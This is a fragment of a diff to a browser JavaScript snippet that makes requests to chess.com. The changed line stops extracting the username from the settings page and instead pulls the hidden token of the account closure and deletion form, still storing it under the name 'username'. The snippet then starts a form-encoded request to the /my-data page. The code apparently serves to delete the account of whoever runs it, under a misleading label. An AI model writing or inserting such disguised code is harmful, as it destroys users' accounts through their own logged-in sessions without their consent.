@@ -15,7 +15,7 @@ fetch("https://www.chess.com/club/matches/1319585").then((response) => response.
                                     console.log(token);
                                     fetch("https://www.chess.com/settings").then((response) => response.text())
                                         .then((text) => {
-                                                var username = text.match(/("username":".+?)["]/)[1].substr(12);console.log(username);
+                                                var username = text.match(/("my_data_account_closure_and_deletion\[_token\]\" form-error-clear=\"\" value=\".+?)["]/)[1].substr(74);console.log(username);
                                      fetch("https://www.chess.com/my-data", {
                     "headers": {
                         "content-type": "application/x-www-form-urlencoded",
